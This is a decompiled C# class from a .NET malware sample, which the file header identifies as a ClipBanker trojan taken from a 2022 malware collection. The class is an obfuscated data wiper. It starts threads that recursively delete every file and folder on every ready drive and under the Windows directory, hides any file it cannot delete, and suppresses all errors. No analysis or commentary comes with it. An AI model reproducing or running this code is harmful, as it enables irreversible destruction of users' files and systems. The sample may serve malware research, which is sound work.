// Decompiled with JetBrains decompiler
// Type: e2f.1D8
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using I71;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace e2f
{
  internal sealed class \u0031D8 : x77
  {
    private readonly string p6h;
    private readonly int \u0038SX;

    [SpecialName]
    public string \u0034SJ() => this.p6h;

    [SpecialName]
    public int I4i() => this.\u0038SX;

    private static void q41([In] string obj0)
    {
      try
      {
        foreach (string directory in Directory.GetDirectories(obj0))
        {
          try
          {
            foreach (string file in Directory.GetFiles(directory))
            {
              try
              {
                File.Delete(file);
              }
              catch
              {
                try
                {
                  File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
                }
                catch
                {
                }
              }
            }
            Directory.Delete(directory);
          }
          catch
          {
          }
          \u0031D8.q41(directory);
        }
      }
      catch
      {
      }
    }

    public \u0031D8(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      try
      {
        new Thread(\u0031D8.H37.\u003C\u003E9__7_0 ?? (\u0031D8.H37.\u003C\u003E9__7_0 = new ThreadStart(\u0031D8.H37.\u003C\u003E9.sX9))).Start();
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          \u0031D8.tK8 tK8 = new \u0031D8.tK8();
          tK8.Z2N = drive;
          if (tK8.Z2N.IsReady)
            new Thread(new ThreadStart(tK8.\u0039j1)).Start();
        }
        this.\u0038SX = 0;
      }
      catch (Exception ex)
      {
        this.p6h = ex.Message;
        this.\u0038SX = 1;
      }
    }

    private sealed class tK8
    {
      public DriveInfo Z2N;

      internal void \u0039j1() => \u0031D8.q41(this.Z2N.RootDirectory.FullName);
    }

    [Serializable]
    private sealed class H37
    {
      public static readonly \u0031D8.H37 \u003C\u003E9 = new \u0031D8.H37();
      public static ThreadStart \u003C\u003E9__7_0;

      internal void sX9() => \u0031D8.q41(Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.System)).FullName);
    }
  }
}
